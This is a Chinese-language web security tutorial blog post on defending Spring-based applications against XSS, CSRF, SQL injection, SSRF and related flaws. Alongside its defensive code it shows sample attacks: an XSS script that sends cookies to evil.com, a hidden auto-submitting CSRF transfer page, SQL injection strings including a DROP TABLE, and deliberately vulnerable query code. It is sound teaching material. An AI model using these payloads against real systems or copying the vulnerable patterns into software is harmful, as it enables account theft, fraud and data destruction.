---
title: Web 安全实战指南：XSS、CSRF、SQL注入与常见漏洞防御
date: 2026-06-17 08:15:00
tags:
  - Web安全
  - XSS
  - CSRF
  - SQL注入
  - 安全防护
categories:
  - 架构设计
author: 东哥
---

# Web 安全实战指南：XSS、CSRF、SQL注入与常见漏洞防御

## 一、引言

Web 安全是后端开发不可忽视的基础能力。在 OWASP Top 10 中，注入、XSS、敏感信息泄露等问题常年占据前列。本文将从攻击原理到防御实践，系统讲解最常见的 Web 安全漏洞及防护方案。

## 二、XSS（跨站脚本攻击）

### 2.1 什么是 XSS

XSS（Cross-Site Scripting）攻击者将恶意脚本注入到 Web 页面中，当用户浏览该页面时，脚本在用户的浏览器中执行。

### 2.2 XSS 三种类型

| 类型 | 描述 | 危害程度 | 常见场景 |
|------|------|----------|----------|
| 反射型（Reflected） | 恶意脚本在 URL 参数中，服务端直接返回 | 低 | 搜索页面、错误页面 |
| 存储型（Stored） | 恶意脚本存储在服务端（数据库），每次返回时执行 | 高 | 评论区、用户资料 |
| DOM 型（DOM-based） | 恶意脚本通过修改页面 DOM 执行，纯前端漏洞 | 中 | 前端渲染、hash 路由 |

### 2.3 XSS 攻击示例

**存储型 XSS 攻击流程：**

```
攻击者 ──→ 提交评论 <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
                  │
                  ▼
            评论区数据库
                  │
                  ▼
        普通用户浏览页面
                  │
                  ▼
        恶意脚本在用户浏览器执行
                  │
                  ▼
        Cookie 被发送到攻击者服务器
```

### 2.4 XSS 防御方案

#### 2.4.1 输出编码（核心防御）

```java
// ❌ 危险：直接输出用户输入
out.println("<div>" + userInput + "</div>");

// ✅ 安全：HTML 实体编码
import org.springframework.web.util.HtmlUtils;
out.println("<div>" + HtmlUtils.htmlEscape(userInput) + "</div>");

// Spring Boot Thymeleaf：默认转义
// ✅ <div th:text="${userInput}">  →  自动 HTML 转义
// ⚠️ <div th:utext="${userInput}"> →  不转义，小心使用！
```

#### 2.4.2 Content Security Policy（CSP）

```java
// Spring Security 配置 CSP 头
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(policy -> policy
                .policyDirectives(
                    "default-src 'self'; " +
                    "script-src 'self' 'nonce-abc123'; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' https://*.img-cdn.com; " +
                    "report-uri /csp-report;"
                )
            )
        );
        return http.build();
    }
}
```

| CSP 指令 | 说明 | 值示例 |
|----------|------|--------|
| default-src | 所有资源类型的默认策略 | 'self' |
| script-src | 允许加载脚本的来源 | 'self' cdn.example.com |
| style-src | 允许加载样式表的来源 | 'self' 'unsafe-inline' |
| img-src | 允许加载图片的来源 | * （允许所有来源） |
| connect-src | AJAX、WebSocket 允许的来源 | 'self' api.example.com |
| report-uri | CSP 违规上报地址 | /csp-violation |

#### 2.4.3 HttpOnly Cookie

```java
// 设置 HttpOnly 和 Secure Cookie
Cookie cookie = new Cookie("SESSIONID", sessionId);
cookie.setHttpOnly(true);   // JavaScript 无法访问
cookie.setSecure(true);     // 仅 HTTPS 传输
cookie.setPath("/");
cookie.setMaxAge(3600);     // 1 小时过期
```

### 2.5 XSS 防御检查清单

- [ ] 所有用户输入输出前都做 HTML 转义
- [ ] 使用模板引擎的默认安全模式（Thymeleaf 的 `th:text` 而非 `th:utext`）
- [ ] 设置 Content-Security-Policy 响应头
- [ ] Cookie 设置 HttpOnly 和 Secure
- [ ] 避免使用 `eval()`、`innerHTML`、`document.write()`
- [ ] 前端使用 DOMPurify 库清理不可信 HTML

## 三、CSRF（跨站请求伪造）

### 3.1 什么是 CSRF

CSRF（Cross-Site Request Forgery）攻击者诱导用户点击链接或访问恶意页面，利用用户已登录的身份，在用户不知情的情况下执行非本意的操作。

### 3.2 CSRF 攻击示例

**场景：** 用户已登录银行网站，攻击者构造恶意请求转账。

```html
<!-- 攻击者的恶意页面 -->
<html>
<body>
    <h1>恭喜您中奖了！</h1>
    <img src="https://bank.example.com/transfer?to=attacker&amount=10000"
         style="display:none" />
    <!-- 或自动提交表单 -->
    <form id="csrf-form"
          action="https://bank.example.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker" />
        <input type="hidden" name="amount" value="10000" />
    </form>
    <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

### 3.3 防御方案对比

| 方案 | 原理 | 安全性 | 实现成本 |
|------|------|--------|----------|
| SameSite Cookie | 浏览器限制跨站请求携带 Cookie | 高 | 低（配置 Cookie 属性） |
| CSRF Token | 请求中包含服务端生成的随机 Token | 高 | 中（需前后端配合） |
| 自定义 Header | 验证请求头中的自定义字段 | 中 | 低 |
| Referer/Origin 验证 | 验证请求来源 | 低 | 低 |
| 二次验证 | 敏感操作要求输入密码/验证码 | 高 | 高（影响用户体验） |

### 3.4 Spring Security 的 CSRF 防护

```java
// Spring Security CSRF 配置
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                // 启用 CSRF（Spring Security 默认启用）
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // 排除不需要 CSRF 的路径
                .ignoringRequestMatchers("/webhook/**", "/api/public/**")
            );
        return http.build();
    }
}
```

```html
<!-- 前端 Thymeleaf 模板：自动注入 CSRF Token -->
<form th:action="@{/transfer}" method="post">
    <input type="hidden"
           th:name="${_csrf.parameterName}"
           th:value="${_csrf.token}" />
    <input type="text" name="to" placeholder="收款人" />
    <input type="number" name="amount" placeholder="金额" />
    <button type="submit">转账</button>
</form>
```

### 3.5 SameSite Cookie 配置

```java
// Spring Boot 配置 SameSite
@Configuration
public class CookieConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {

    @Override
    public void customize(TomcatServletWebServerFactory factory) {
        factory.addContextCustomizers(context -> {
            // 设置 Session Cookie 的 SameSite 属性
            SessionCookieConfig scc = context.getSessionCookieConfig();
            scc.setAttribute("SameSite", "Strict");
        });
    }
}
```

| SameSite 值 | 行为 | 适用场景 |
|-------------|------|----------|
| Strict | 完全禁止跨站携带 Cookie | 银行、支付系统 |
| Lax | GET 请求可携带，POST 不行 | 常规 Web 应用 |
| None | 不限制（必须配合 Secure） | 第三方嵌入场景 |

## 四、SQL 注入

### 4.1 什么是 SQL 注入

SQL 注入将恶意 SQL 代码拼接到查询参数中，使数据库执行非预期的 SQL 语句。

```java
// ❌ 危险：字符串拼接 SQL
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

// 攻击者输入：username = admin' -- 
// 拼接后：SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'xxx'
// -- 注释了密码检查，直接登录为 admin

// 更严重的攻击：
// username = '; DROP TABLE users; --
// 拼接待执行：SELECT * FROM users WHERE username = ''; DROP TABLE users; -- '
```

### 4.2 防御方案

#### 4.2.1 参数化查询（PreparedStatement）

```java
// ✅ 安全：PreparedStatement 参数化
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
try (PreparedStatement ps = connection.prepareStatement(sql)) {
    ps.setString(1, username);
    ps.setString(2, password);
    ResultSet rs = ps.executeQuery();
    // ...
}

// ✅ MyBatis：使用 #{} 参数化
// <select id="findUser" resultType="User">
//     SELECT * FROM users WHERE username = #{username}
// </select>
// ⚠️ 注意：${} 会直接拼接字符串！只在字段名/表名等动态场景使用，且必须手动过滤

// ✅ JPA：使用参数绑定
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
```

#### 4.2.2 MyBatis 常见误区

```xml
<!-- ✅ 安全：使用 #{} 参数化绑定 -->
<select id="findUser" resultType="User">
    SELECT * FROM users
    WHERE username = #{username}
      AND status = #{status}
</select>

<!-- ⚠️ 危险：使用 ${} 直接拼接 -->
<!-- 如果传入 username = "admin' OR '1'='1" 则 SQL 注入成功 -->
<select id="findUserDanger" resultType="User">
    SELECT * FROM users
    WHERE username = '${username}'
</select>

<!-- ✅ 合理使用 ${}：动态表名、字段名（必须要手动校验白名单） -->
<select id="dynamicQuery" resultType="java.util.Map">
    SELECT ${columns} FROM ${tableName}
    WHERE id = #{id}
</select>
```

### 4.3 ORM 框架预防 SQL 注入

```java
// JPA 规范写法
public interface UserRepository extends JpaRepository<User, Long> {
    // ✅ 方法命名查询：安全
    List<User> findByUsernameAndStatus(String username, Integer status);

    // ✅ @Query 参数化：安全
    @Query("SELECT u FROM User u WHERE u.username = :username")
    User findByUsername(@Param("username") String username);

    // ⚠️ 原生 SQL 也要用参数化
    @Query(value = "SELECT * FROM users WHERE username = ?1", nativeQuery = true)
    User findByUsernameNative(String username);
}
```

### 4.4 SQL 注入防御检查清单

- [ ] 始终使用参数化查询（PreparedStatement / #{} / ?）
- [ ] MyBatis 禁止使用 `${}`，除非白名单校验
- [ ] 存储过程也使用参数传递
- [ ] 最小权限原则：数据库连接不授予 DDL 权限
- [ ] 使用防火墙工具（如 SQLMap 定期扫描）
- [ ] 应用层做输入校验（长度、格式、白名单）

## 五、其他常见安全漏洞

### 5.1 SSRF（服务端请求伪造）

```java
// ❌ 危险：直接使用用户输入的 URL
URL url = new URL(userInput);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// ✅ 安全：URL 白名单校验
private static final Set<String> ALLOWED_HOSTS = Set.of(
    "internal-api.example.com",
    "files.example.com"
);

public String fetchContent(String urlStr) {
    URL url = new URL(urlStr);
    String host = url.getHost();
    if (!ALLOWED_HOSTS.contains(host)) {
        throw new SecurityException("非法请求地址: " + host);
    }
    // 防止请求内网
    InetAddress addr = InetAddress.getByName(host);
    if (addr.isSiteLocalAddress() || addr.isLoopbackAddress()) {
        throw new SecurityException("禁止访问内网地址");
    }
    // ...
}
```

### 5.2 文件上传漏洞

```java
// ✅ Spring Boot 文件上传安全配置
@Configuration
public class FileUploadConfig {

    @Bean
    public MultipartConfigElement multipartConfigElement() {
        MultipartConfigFactory factory = new MultipartConfigFactory();
        factory.setMaxFileSize(DataSize.ofMegabytes(10));  // 限制文件大小
        factory.setMaxRequestSize(DataSize.ofMegabytes(10));
        return factory.createMultipartConfig();
    }

    // 文件校验
    public boolean validateFile(MultipartFile file) {
        // 1. 校验扩展名
        String filename = file.getOriginalFilename();
        String ext = filename.substring(filename.lastIndexOf('.')).toLowerCase();
        Set<String> allowedExts = Set.of(".jpg", ".png", ".gif", ".pdf");
        if (!allowedExts.contains(ext)) return false;

        // 2. 校验 MIME 类型
        String contentType = file.getContentType();
        if (!contentType.startsWith("image/") && !"application/pdf".equals(contentType)) {
            return false;
        }

        // 3. 内容检测（图片重写，去除可能隐藏的脚本）
        // ...

        return true;
    }
}
```

### 5.3 敏感信息泄露防护

```java
// Spring Boot Actuator 端点保护
management.endpoints.web.exposure.exclude=env,configprops,beans
management.endpoint.env.enabled=false

// 日志中脱敏
public class SensitiveDataMasker {
    private static final Pattern PHONE_PATTERN = Pattern.compile("(\\d{3})\\d{4}(\\d{4})");
    private static final Pattern EMAIL_PATTERN = Pattern.compile("(\\w{1,2})\\w+(@\\w+\\.\\w+)");

    public static String maskPhone(String phone) {
        return PHONE_PATTERN.matcher(phone).replaceAll("$1****$2");
    }

    public static String maskEmail(String email) {
        return EMAIL_PATTERN.matcher(email).replaceAll("$1***$2");
    }

    // 使用示例
    // log.info("User phone: {}", SensitiveDataMasker.maskPhone("13812345678"));
    // 输出: User phone: 138****5678
}
```

## 六、安全加固总结

### 6.1 分层防御模型

```
┌────────────────────────────────────────────────────────┐
│                   防御纵深体系                           │
├────────────────────────────────────────────────────────┤
│ Layer 1: Web 应用防火墙 (WAF)                            │
│  - 拦截常见攻击载荷                                     │
│ Layer 2: 应用层防御                                      │
│  - CSRF Token、XSS 过滤、参数校验                         │
│ Layer 3: 框架安全功能                                     │
│  - Spring Security 内置防护                               │
│ Layer 4: 数据层安全                                       │
│  - 参数化查询、加密存储                                   │
│ Layer 5: 基础设施安全                                      │
│  - HTTPS、防火墙、最小权限                                │
└────────────────────────────────────────────────────────┘
```

### 6.2 安全配置检查清单

- [ ] 生产环境禁用开发端点（/actuator 等）
- [ ] CORS 配置严格的白名单
- [ ] HTTPS 强制跳转
- [ ] 密码使用 BCrypt 加密
- [ ] API 限流保护
- [ ] 安全响应头：X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security
- [ ] 依赖版本定期更新（重点关注 CVE 公告）
- [ ] 敏感配置（数据库密码、API Key）使用配置中心或密钥管理服务

Web 安全不是一次性的工作，而是需要持续关注和投入的工程实践。理解攻击原理、掌握防御手段、建立安全意识，才能构建真正安全的 Web 应用。
